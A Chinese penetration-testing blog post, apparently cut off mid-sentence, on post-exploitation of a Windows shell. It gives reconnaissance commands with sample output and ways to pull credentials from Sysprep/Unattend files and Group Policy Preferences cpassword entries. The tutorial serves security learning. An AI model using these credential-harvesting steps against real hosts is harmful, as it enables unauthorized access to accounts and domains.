@@ -1,0 +1,486 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>拿到一个普通的 Windows Shell 以后能做什么 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">拿到一个普通的 Windows Shell 以后能做什么</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">拿到一个普通的 Windows Shell 以后能做什么</h1><div class="post-meta">Jan 27, 2019<span> | </span><span class="category"><a href="/categories/渗透测试/">渗透测试</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-信息收集"><span class="toc-number">2.</span> <span class="toc-text">0X01 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-收集系统信息："><span class="toc-number">2.1.</span> <span class="toc-text">1.收集系统信息：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-主机名和Shell用户名"><span class="toc-number">2.2.</span> <span class="toc-text">2.主机名和Shell用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-其他用户组和当前用户详细信息"><span class="toc-number">2.3.</span> <span class="toc-text">3.其他用户组和当前用户详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-网络配置信息"><span class="toc-number">2.4.</span> <span class="toc-text">4.网络配置信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-检查主机的端口开放情况"><span class="toc-number">2.5.</span> <span class="toc-text">5.检查主机的端口开放情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-检查主机的防火墙规则"><span class="toc-number">2.6.</span> <span class="toc-text">6.检查主机的防火墙规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-计划任务"><span class="toc-number">2.7.</span> <span class="toc-text">7.计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-正在运行的进程"><span class="toc-number">2.8.</span> <span class="toc-text">8.正在运行的进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-已经启动的服务"><span class="toc-number">2.9.</span> <span class="toc-text">9.已经启动的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-已经安装的驱动"><span class="toc-number">2.10.</span> <span class="toc-text">10.已经安装的驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-使用-wmic-收集重要信息"><span class="toc-number">2.11.</span> <span class="toc-text">11.使用 wmic 收集重要信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-利用特权提升漏洞直接提权"><span class="toc-number">3.</span> <span class="toc-text">0X02 利用特权提升漏洞直接提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-在计算机中获取明文或者可解密的密码"><span class="toc-number">4.</span> <span class="toc-text">0X03 在计算机中获取明文或者可解密的密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-使用-Sysprep-exe-批量部署"><span class="toc-number">4.1.</span> <span class="toc-text">1.使用 Sysprep.exe 批量部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-使用-GPP-Group-Policy-Preferences-部署"><span class="toc-number">4.2.</span> <span class="toc-text">1.使用 GPP(Group Policy Preferences) 部署</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-辅助的命令"><span class="toc-number">5.</span> <span class="toc-text">0X04 辅助的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-下面的命令将在文件系统中搜索包含特定关键字的文件名-可以指定任意多的关键字。"><span class="toc-number">5.1.</span> <span class="toc-text">1.下面的命令将在文件系统中搜索包含特定关键字的文件名,可以指定任意多的关键字。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-搜索某些文件类型的关键字"><span class="toc-number">5.2.</span> <span class="toc-text">2.搜索某些文件类型的关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。"><span class="toc-number">5.3.</span> <span class="toc-text">3.下面的两个命令可以用于grep注册表中的关键字，在本例中是“password”。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-辅助的工具"><span class="toc-number">6.</span> <span class="toc-text">0X05 辅助的工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#accesschk-exe-来批量检查权限信息"><span class="toc-number">6.1.</span> <span class="toc-text">accesschk.exe 来批量检查权限信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-查看-d-test-目录下所有文件对每个用户组的权限情况"><span class="toc-number">6.1.1.</span> <span class="toc-text">1.查看 d:/test 目录下所有文件对每个用户组的权限情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-查看指定用户组对文件夹下文件的权限"><span class="toc-number">6.1.2.</span> <span class="toc-text">2.查看指定用户组对文件夹下文件的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-查看某个用户组对指定服务的权限"><span class="toc-number">6.1.3.</span> <span class="toc-text">3.查看某个用户组对指定服务的权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-查看对某个用户组有写权限的所有服务"><span class="toc-number">6.1.4.</span> <span class="toc-text">4.查看对某个用户组有写权限的所有服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-查看某个用户或用户组对某个注册表项的权限"><span class="toc-number">6.1.5.</span> <span class="toc-text">5.查看某个用户或用户组对某个注册表项的权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-权限维持"><span class="toc-number">7.</span> <span class="toc-text">0X06 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-简单的介绍一下"><span class="toc-number">7.1.</span> <span class="toc-text">1.简单的介绍一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用步骤"><span class="toc-number">7.2.</span> <span class="toc-text">2.利用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-首先在我的公网-vps-开启-msf-建立监听"><span class="toc-number">7.2.1.</span> <span class="toc-text">1.首先在我的公网 vps 开启 msf 建立监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-利用-DllHijackAuditor-工具进行-dll-劫持检测"><span class="toc-number">7.2.2.</span> <span class="toc-text">2.利用 DllHijackAuditor 工具进行 dll 劫持检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-在本地的-msf-上生成需要利用的-payload"><span class="toc-number">7.2.3.</span> <span class="toc-text">3.在本地的 msf 上生成需要利用的 payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-运行后获取-meterpreter-的shell"><span class="toc-number">7.2.4.</span> <span class="toc-text">4.运行后获取 meterpreter 的shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>看到一篇文章讲到这个内容，就打算自己也整理一下顺便梳理一下思路</p>
+<h2 id="0X01-信息收集"><a href="#0X01-信息收集" class="headerlink" title="0X01 信息收集"></a><strong>0X01 信息收集</strong></h2><h3 id="1-收集系统信息："><a href="#1-收集系统信息：" class="headerlink" title="1.收集系统信息："></a><strong>1.收集系统信息：</strong></h3><p>系统信息至关重要，关乎我们后面怎么提权</p>
+<pre><code>中文系统：systeminfo|findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
+英文系统: systeminfo|findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;
+</code></pre><p><strong>例如：</strong></p>
+<pre><code>C:\Users\Administrator&gt;systeminfo|findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;
+OS 名称:          Microsoft Windows Server 2008 R2 Standard
+OS 版本:          6.1.7600 暂缺 Build 7600
+</code></pre><a id="more"></a>
+<h3 id="2-主机名和Shell用户名"><a href="#2-主机名和Shell用户名" class="headerlink" title="2.主机名和Shell用户名"></a><strong>2.主机名和Shell用户名</strong></h3><pre><code>C:\Users\Administrator&gt;hostname
+WIN-ITRDTMACNHN
+
+C:\Users\Administrator&gt;echo %username%
+Administrator
+</code></pre><h3 id="3-其他用户组和当前用户详细信息"><a href="#3-其他用户组和当前用户详细信息" class="headerlink" title="3.其他用户组和当前用户详细信息"></a><strong>3.其他用户组和当前用户详细信息</strong></h3><p>通过这个信息收集我们能判断我们的用户属于什么用户组</p>
+<pre><code>C:\Users\Administrator&gt;net users
+
+\\WIN-ITRDTMACNHN 的用户帐户
+
+--------------------------------------------------------------
+Administrator            FTPuser                  Guest
+命令成功完成。
+
+
+C:\Users\Administrator&gt;net user Administrator
+用户名                 Administrator
+全名
+注释                   管理计算机(域)的内置帐户
+用户的注释
+国家/地区代码          000 (系统默认值)
+帐户启用               Yes
+帐户到期               从不
+
+上次设置密码           2018/6/28 16:32:48
+密码到期               2018/8/9 16:32:48
+密码可更改             2018/6/28 16:32:48
+需要密码               Yes
+用户可以更改密码       Yes
+
+允许的工作站           All
+登录脚本
+用户配置文件
+主目录
+上次登录               2018/9/30 11:34:43
+
+可允许的登录小时数     All
+
+本地组成员             *Administrators
+全局组成员             *None
+命令成功完成。
+</code></pre><h3 id="4-网络配置信息"><a href="#4-网络配置信息" class="headerlink" title="4.网络配置信息"></a><strong>4.网络配置信息</strong></h3><p>使用下面的三条命名就能比较好的看出主机    </p>
+<pre><code>ipconfig /all
+route print 
+arp -A
+</code></pre><h3 id="5-检查主机的端口开放情况"><a href="#5-检查主机的端口开放情况" class="headerlink" title="5.检查主机的端口开放情况"></a><strong>5.检查主机的端口开放情况</strong></h3><pre><code>netstat -ano
+</code></pre><h3 id="6-检查主机的防火墙规则"><a href="#6-检查主机的防火墙规则" class="headerlink" title="6.检查主机的防火墙规则"></a><strong>6.检查主机的防火墙规则</strong></h3><pre><code>C:\Users\Administrator&gt;netsh firewall show state
+
+防火墙状态:
+-------------------------------------------------------------------
+配置文件                          = 标准
+操作模式                          = 启用
+例外模式                          = 启用
+多播/广播响应模式                 = 启用
+通知模式                          = 禁用
+组策略版本                        = Windows 防火墙
+远程管理模式                      = 禁用
+
+所有网络接口上的端口当前均为打开状态:
+端口   协议  版本  程序
+-------------------------------------------------------------------
+800    TCP       任何       (null)
+
+
+C:\Users\Administrator&gt;netsh firewall show config
+
+域 配置文件配置:
+-------------------------------------------------------------------
+操作模式                          = 启用
+例外模式                          = 启用
+多播/广播响应模式                 = 启用
+通知模式                          = 禁用
+
+域 配置文件的允许的程序配置:
+模式     流量方向             名称/程序
+-------------------------------------------------------------------
+禁用       入站                   Windows 服务主进程 / C:\Windows\System32\svch
+st.exe
+禁用       入站                   Internet Explorer / C:\Program Files (x86)\In
+ernet Explorer\iexplore.exe
+
+域 配置文件的端口配置:
+端口   协议    流量方向              名称
+-------------------------------------------------------------------
+800    TCP       启用      入站                    test
+
+域 配置文件的 ICMP 配置:
+模式     类型  描述
+-------------------------------------------------------------------
+启用       2     允许出站数据包太大
+
+标准 配置文件配置(当前):
+-------------------------------------------------------------------
+操作模式                          = 启用
+例外模式                          = 启用
+多播/广播响应模式                 = 启用
+通知模式                          = 禁用
+
+标准 配置文件的允许的程序配置:
+模式     流量方向             名称/程序
+-------------------------------------------------------------------
+启用       入站                   Windows 服务主进程 / C:\Windows\System32\svch
+st.exe
+
+标准 配置文件的端口配置:
+端口   协议    流量方向              名称
+-------------------------------------------------------------------
+800    TCP       启用      入站                    test
+
+标准 配置文件的 ICMP 配置:
+模式     类型  描述
+-------------------------------------------------------------------
+启用       2     允许出站数据包太大
+
+日志配置:
+-------------------------------------------------------------------
+文件位置        = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
+文件大小上限    = 4096 KB
+丢弃的数据包数  = 禁用
+连接数          = 禁用
+</code></pre><h3 id="7-计划任务"><a href="#7-计划任务" class="headerlink" title="7.计划任务"></a><strong>7.计划任务</strong></h3><pre><code>C:\Users\K0rz3n&gt;schtasks /query /fo LIST /v
+
+主机名:                             DESKTOP-S2L4C24
+任务名:                             \CorelUpdateHelperTaskCore
+下次运行时间:                       2019/1/23 0:32:42
+模式:                               就绪
+登录状态:                           交互方式/后台方式
+上次运行时间:                       2019/1/22 0:32:42
+上次结果:                           0
+创建者:                             N/A
+要运行的任务:                       c:\Program Files (x86)\Corel\CUH\v2\CUH.exe /t
+起始于:                             N/A
+注释:                               N/A
+计划任务状态:                       已启用
+空闲时间:                           已禁用
+电源管理:                           在电池模式停止, 不用电池启动
+作为用户运行:                       Users
+删除没有计划的任务:                 已禁用
+如果运行了 X 小时 X 分钟，停止任务: 72:00:00
+计划:                               计划数据在此格式中不可用。
+计划类型:                           每天
+开始时间:                           0:32:42
+开始日期:                           2018/10/7
+结束日期:                           N/A
+天:                                 每 1 天
+月:                                 N/A
+重复: 每:                           已禁用
+重复: 截止: 时间:                   已禁用
+重复: 截止: 持续时间:               已禁用
+重复: 如果还在运行，停止:           已禁用
+</code></pre><h3 id="8-正在运行的进程"><a href="#8-正在运行的进程" class="headerlink" title="8.正在运行的进程"></a><strong>8.正在运行的进程</strong></h3><pre><code>C:\Users\Administrator&gt;tasklist /SVC
+
+映像名称                       PID 服务
+========================= ======== =======================================
+System Idle Process              0 暂缺
+System                           4 暂缺
+smss.exe                       232 暂缺
+csrss.exe                      332 暂缺
+wininit.exe                    384 暂缺
+csrss.exe                      392 暂缺
+winlogon.exe                   448 暂缺
+services.exe                   484 暂缺
+lsass.exe                      500 SamSs
+lsm.exe                        508 暂缺
+svchost.exe                    608 DcomLaunch, PlugPlay, Power
+vmacthlp.exe                   672 VMware Physical Disk Helper Service
+svchost.exe                    716 RpcEptMapper, RpcSs
+svchost.exe                    788 Dhcp, eventlog, lmhosts
+svchost.exe                    844 gpsvc, IKEEXT, iphlpsvc, LanmanServer,
+                                   ProfSvc, Schedule, seclogon, SENS,
+                                   ShellHWDetection, Winmgmt, wuauserv
+svchost.exe                    932 EventSystem, netprofm, nsi
+svchost.exe                    996 Netman, TrkWks, UxSms
+svchost.exe                    256 CryptSvc, Dnscache, LanmanWorkstation,
+                                   NlaSvc, WinRM
+svchost.exe                    688 BFE, DPS, MpsSvc
+spoolsv.exe                   1092 Spooler
+svchost.exe                   1124 AppHostSvc
+svchost.exe                   1148 ftpsvc
+svchost.exe                   1324 RemoteRegistry
+...
+</code></pre><h3 id="9-已经启动的服务"><a href="#9-已经启动的服务" class="headerlink" title="9.已经启动的服务"></a><strong>9.已经启动的服务</strong></h3><pre><code>C:\Users\Administrator&gt;net start
+已经启动以下 Windows 服务:
+
+   Application Host Helper Service
+   Base Filtering Engine
+   COM+ Event System
+   COM+ System Application
+   Cryptographic Services
+   DCOM Server Process Launcher
+   Desktop Window Manager Session Manager
+   DHCP Client
+   Diagnostic Policy Service
+   Distributed Link Tracking Client
+   Distributed Transaction Coordinator
+   DNS Client
+   Group Policy Client
+   IKE and AuthIP IPsec Keying Modules
+   IP Helper
+   IPsec Policy Agent
+   Microsoft FTP Service
+   Network Connections
+   Network List Service
+   Network Location Awareness
+   Network Store Interface Service
+   Plug and Play
+   Power
+   Print Spooler
+   Remote Procedure Call (RPC)
+   Remote Registry
+   RPC Endpoint Mapper
+   ...
+</code></pre><h3 id="10-已经安装的驱动"><a href="#10-已经安装的驱动" class="headerlink" title="10.已经安装的驱动"></a><strong>10.已经安装的驱动</strong></h3><pre><code>C:\Users\Administrator&gt;driverquery
+
+模块名       显示名称               驱动程序类型  链接日期
+============ ====================== ============= ======================
+1394ohci     1394 OHCI Compliant Ho Kernel        2009/7/14 8:07:12
+ACPI         Microsoft ACPI Driver  Kernel        2009/7/14 7:19:34
+AcpiPmi      ACPI Power Meter Drive Kernel        2009/7/14 7:27:17
+adp94xx      adp94xx                Kernel        2008/12/6 7:54:42
+adpahci      adpahci                Kernel        2007/5/2 1:30:09
+adpu320      adpu320                Kernel        2007/2/28 8:04:15
+AFD          Ancillary Function Dri Kernel        2009/7/14 7:21:40
+agp440       Intel AGP Bus Filter   Kernel        2009/7/14 7:38:43
+aliide       aliide                 Kernel        2009/7/14 7:19:47
+amdide       amdide                 Kernel        2009/7/14 7:19:49
+AmdK8        AMD K8 Processor Drive Kernel        2009/7/14 7:19:25
+AmdPPM       AMD Processor Driver   Kernel        2009/7/14 7:19:25
+amdsata      amdsata                Kernel        2009/5/20 1:53:21
+amdsbs       amdsbs                 Kernel        2009/3/21 2:36:03
+amdxata      amdxata                Kernel        2009/5/20 1:56:59
+...
+</code></pre><h3 id="11-使用-wmic-收集重要信息"><a href="#11-使用-wmic-收集重要信息" class="headerlink" title="11.使用 wmic 收集重要信息"></a><strong>11.使用 wmic 收集重要信息</strong></h3><p>运行下面这个脚本来收集进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的 Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</p>
+<pre><code>for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;
+
+wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html
+wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html
+</code></pre><p><strong>补充：</strong></p>
+<p>使用下面的命令也可获取主机的已经安装的补丁信息</p>
+<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn
+</code></pre><h2 id="0X02-利用特权提升漏洞直接提权"><a href="#0X02-利用特权提升漏洞直接提权" class="headerlink" title="0X02 利用特权提升漏洞直接提权"></a><strong>0X02 利用特权提升漏洞直接提权</strong></h2><p>这一部分的内容我在我的 <strong>渗透测试小技巧一</strong> 中 写过了，这里就不在赘述</p>
+<h2 id="0X03-在计算机中获取明文或者可解密的密码"><a href="#0X03-在计算机中获取明文或者可解密的密码" class="headerlink" title="0X03 在计算机中获取明文或者可解密的密码"></a><strong>0X03 在计算机中获取明文或者可解密的密码</strong></h2><p>现实的域环境中会有大量的服务器需要配置，作为一个管理员是不可能一台一台的配置的，他们通常会选择自动化安装或者克隆，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码。</p>
+<h3 id="1-使用-Sysprep-exe-批量部署"><a href="#1-使用-Sysprep-exe-批量部署" class="headerlink" title="1.使用 Sysprep.exe 批量部署"></a><strong>1.使用 Sysprep.exe 批量部署</strong></h3><p>为同类计算环境中具有相似硬件配置的基于 Windows 的成千上万台计算机进行部署的企业客户希望能自定义一台计算机，然后将其硬盘（或”映像”）复制到公司的其他计算机上。同样，网络管理员希望在必要时能在时间关键的环境中快速替换计算机。</p>
+<p>单位中的系统管理员通常会预装客户计算机，或物理访问每台客户机以安装操作系统，Sysprep 的设计旨在降低此类任务产生的费用。它使管理员（或第三方集成商）能将单个工作站配置复制到多台客户机，从而大大节约了管理时间和资源。管理员只需做出一组有关计算机设置的假设，从而减少了标准 Windows 安装的开销。</p>
+<p><strong>Sysprep.inf</strong><br>作为建立并部署标准映像的一部分，您可能需要为单个目标计算机自定义少量设置及参数。例如，每个基于 Windows 2000 的计算机需要有唯一的计算机名。”最小安装向导”通常会提示用户保留信息。不过在许多情况下，如果您知道必要信息并且不希望提示用户输入这些信息，则可使用可选的应答文件 Sysprep.inf 实现自动输入。使用 Sysprep.inf 文件，您可让”最小安装向导”只提示某些信息，或创建完全自动的安装。</p>
+<p><strong>最小安装向导</strong><br>计算机第一次从复制磁盘启动时，”最小安装向导”启动。它收集新复制的目标计算机所需的全部信息。如果不使用 Sysprep.inf，则”最小安装向导”显示以下项目：</p>
+<pre><code>欢迎
+Microsoft 许可协议
+产品 ID
+区域设置
+用户名和公司
+计算机名和管理员密码
+TAPI 设置（仅适于有调制解调器时）
+网络配置
+加入工作组或域（仅适于工作站）
+服务器许可（仅适于服务器）
+时区选择
+完成/重新启动
+</code></pre><p>也就是说，我们在 sysprep.inf 中指定的信息克隆计算机在安装时就会默认填好，并且不能被更改，那么如果管理员填入了密码的话我们就能通过这个文件获取</p>
+<blockquote>
+<p>当然除了使用 sysprep 这种方式以外，还有与之类似的无人安装的方式，这种方式使用的配置文件是 unattend.txt</p>
+</blockquote>
+<p><strong>通常这些敏感文件会出现在下面目录</strong></p>
+<pre><code>c:\sysprep.inf
+
+c:\sysprep\sysprep.xml
+
+%WINDIR%\Panther\Unattend\Unattended.xml
+
+%WINDIR%\Panther\Unattended.xml
+</code></pre><p>这些配置文件极可能包含明文密码，也可能会出现 base64 编码的情况，下面是一些配置文件的事例：</p>
+<pre><code># This is a sample from sysprep.inf with clear-text credentials.
+
+[GuiUnattended]
+OEMSkipRegional=1
+OemSkipWelcome=1
+AdminPassword=s3cr3tp4ssw0rd
+TimeZone=20
+
+# This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not
+encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.
+
+&lt;LocalAccounts&gt;
+    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;
+        &lt;Password&gt;
+            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+            &lt;PlainText&gt;false&lt;/PlainText&gt;
+        &lt;/Password&gt;
+        &lt;Description&gt;Local Administrator&lt;/Description&gt;
+        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
+        &lt;Group&gt;Administrators&lt;/Group&gt;
+        &lt;Name&gt;Administrator&lt;/Name&gt;
+    &lt;/LocalAccount&gt;
+&lt;/LocalAccounts&gt;
+
+# Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.
+
+&lt;AutoLogon&gt;
+    &lt;Password&gt;
+        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
+        &lt;PlainText&gt;false&lt;/PlainText&gt;
+    &lt;/Password&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Username&gt;Administrator&lt;/Username&gt;
+&lt;/AutoLogon&gt;
+</code></pre><p>关于以上更详细的内容请参看  <a href="https://www.xuebuyuan.com/2082105.html" target="_blank" rel="noopener">这篇文章</a></p>
+<h3 id="1-使用-GPP-Group-Policy-Preferences-部署"><a href="#1-使用-GPP-Group-Policy-Preferences-部署" class="headerlink" title="1.使用 GPP(Group Policy Preferences) 部署"></a><strong>1.使用 GPP(Group Policy Preferences) 部署</strong></h3><p>在域中，存在一个默认的共享路径：</p>
+<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\
+</code></pre><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
+<p>例如，测试主机所在域为test.local，可访问共享文件夹\test.local\SYSVOL\test.local，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP1.png" alt="此处输入图片的描述"></p>
+<p>想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式</p>
+<p>给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下：</p>
+<pre><code>strComputer = &quot;.&quot;
+Set objUser = GetObject(&quot;WinNT://&quot; &amp; strComputer &amp; &quot;/Administrator, user&quot;)
+objUser.SetPassword &quot;domain123!&quot;
+objUser.SetInfo
+</code></pre><p>这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中,而该vbs脚本通常会保存在共享文件夹\SYSVOL</p>
+<blockquote>
+<p><strong>这就存在一个隐患:</strong></p>
+<p>任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码</p>
+</blockquote>
+<p>于是我们还可以通过 GPP（组策略偏好）来进行配置</p>
+<p><strong>开始-管理工具-组策略管理<br>选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP2.png" alt="此处输入图片的描述"></p>
+<p><strong>设置名称为test6<br>test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP3.png" alt="此处输入图片的描述"></p>
+<p><strong>更新，administrator(内置),设置密码，如下图</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP4.png" alt="此处输入图片的描述"></p>
+<p><strong>委派，设置权限<br>在详细一栏，可看到该策略对应的ID为{E6424F10-C44B-4C45-8527-740189CBF60E}</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP5.png" alt="此处输入图片的描述"></p>
+<p><strong>至此，组策略配置完成，域内主机重新登录，即可应用此策略，在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图</strong></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GPP6.png" alt="此处输入图片的描述"></p>
+<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p>
+<pre><code>\\test.local\SYSVOL\test.local\Policies\{E6424F10-C44B-4C45-8527-740189CBF60E}\User\Preferences\Groups
+</code></pre><p><strong>Groups.xml内容如下：</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
+- &lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
+- &lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2017-09-25 22:57:53&quot; uid=&quot;{463245FF-08D3-4A28-95E7-42AB416DC508}&quot;&gt;
+  &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot; /&gt; 
+  &lt;/User&gt;
+  &lt;/Groups&gt;
+</code></pre><p><strong>值得注意的是其中的cpassword项，保存的是加密后的内容”9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U”<br>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</strong></p>
